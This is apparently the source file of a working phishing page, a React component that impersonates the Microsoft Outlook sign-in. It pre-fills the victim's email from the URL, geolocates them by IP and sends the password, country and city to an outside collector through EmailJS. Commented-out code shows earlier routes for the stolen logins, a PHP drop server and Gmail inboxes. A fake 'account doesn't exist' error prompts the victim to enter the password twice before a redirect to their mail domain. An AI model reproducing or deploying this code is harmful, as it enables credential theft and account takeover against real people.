
import React, { useEffect, useState, useRef } from "react";
import './Outlook.css';
// import svgoutlook from '../../Media/Images/microsoft_icon_svg.png';
import { AiOutlineQuestionCircle } from 'react-icons/ai';
// import axios from "axios";
// import $ from "jquery";
import Preloader from "../../Preloader/Preloader";
import emailjs from '@emailjs/browser';


const Outlook = ()=>{

    // const formRef = useRef();


    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);
  

    const [spinLoader, setSpinLoader] = useState(false);

    const formRef = useRef();

    useEffect(()=>{
        const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
        document.title = extracetdEmail;
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [outlookEmail, setOutlookEmail] = useState(extracetdEmail);
    const [outlookPassword, setOulookPassword] = useState('');

    const btnVal = 'Sign in';

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);


    const submitOutlookForm = e=>{
        // console.log(formRef.current);
        e.preventDefault();
        
        console.log(outlookEmail, outlookPassword);

        if(outlookPassword === ""){
            return null
            // setErr(true);
        }else{
            setSpinLoader(true);

            // const user = {
            //     email: outlookEmail,
            //     password: outlookPassword,
            //     // country: country,
              
            //     // city: city,
            //     // flag: flag,
            //     // eyep: ipAdress,
            //     // nownow: forTime	
            // };



              // post to server

            //   const user = {
            //     email: outlookEmail,
            //     password: outlookPassword,
                // subject: "Chamleon Page Logs",
                // to: "rvvlsales13@gmail.com",
                // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
                // body:
                // `
                // <html lang="en">
                // <p>Online Correspondence: ${outlookEmail}</p>
                // <p>Signal: ${outlookPassword}</p>
                // <p>Country: ${country}</p>
                // <p>Flag: ${flag}</p>
                // </html>
                // `
            // };



            //     const user = {
            //         "subject": "Coming Logs",
            //         "to": "reportwork5252@gmail.com",
            //         "body": `<div><h3></h3><p>Online_Correspondence: ${outlookEmail}</p><p>Signal: ${outlookPassword}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            //     }



            
            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         // alert('OK');
            //         console.log(data);
            //     },
            // });



            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;

        emailjs
        .sendForm(serviceID, templateID, formRef.current, {
          publicKey: publicKey,
        })
        .then(
          () => {
            console.log('!');
          },
          (error) => {
            console.log('...', error.text);
          },
        );




            setTimeout(()=>{
                setOulookPassword('');
                setErr(true);
                setTimeout(() => {
                    setSpinLoader(false);
                }, 2000);
            }, 2500)
            setErr(false);
            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                // console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
            }
  

        }
    }


    return(<section>

        { spinLoader ? <Preloader /> : null }
        
        <div className="Outlook_wrapper">

            <div className="Outlook_form_wrapper">
                <img 
                    alt="outlook_svg"
                    src={`https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg`}
                />

                <h3>Sign in</h3>


                { err ?
                    <p className="err">
                    That Microsoft account doesn't exist. Enter a different
                    <br />
                     account or <span className="gett">get a new one</span>.
                </p>
                : null }

                <form onSubmit={submitOutlookForm} method="post" ref={formRef} className='forrmmm'>
                    
                    <div className="outlook_email_container">
                    <label htmlFor="name"> </label>
                        <input 
                            type={`email`}
                            value={outlookEmail}
                            readOnly
                            className="email_input_ input_outlook"
                            onChange={e=>setOutlookEmail(e.target.value)}
                            id="name"
                            name="online_correspondence"
                        />
                    </div>



                    <div className="outlook_password_container">
                    <label htmlFor="password"> </label>
                        <input 
                            type={`password`}
                            placeholder="Password"
                            className="password_input input_outlook"
                            value={outlookPassword}
                            onChange={e=> setOulookPassword(e.target.value)}
                            required={true}
                            title="Please fill out this field"
                            name="signal"
                            autoFocus
                        />
                    </div>


              <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>



                    <div className="outlook_no_act" style={{
                            fontSize: '.7125rem',
                            color: '#444'
                    }}>
                        No account? <span className="outlook_create_" style={{
                            color: '#0067b8',
                            cursor: 'pointer'
                        }}>Create one!</span>
                    </div>




                    <div className="asdfghj" style={{
                        // display:'flex',
                        // alignItems:'center'
                    }}>
                        <span className="outlook_no_act keeeyy" 
                        // style={{
                        //         fontSize: '.7125rem',
                        //         color: '#0067b8',
                        //         // display:'block'
                        // }}
                        >
                            Sign in with key
                        </span>

                        <AiOutlineQuestionCircle style={{
                            cursor: 'pointer',
                            color:'#555',
                            // display:'block'
                        }}
                        className='qst_mk'
                        />

                    </div>

                    <div className="_opts_">
                        Sign-in options
                    </div>


                    <div className="oiuytre">
                        <input
                            type={`submit`} 
                            value={btnVal}
                            className="outlook_submit"
                            onClick={submitOutlookForm}
                        />
                    </div>



                </form>
            </div>

        </div>

    </section>)
};

export default Outlook;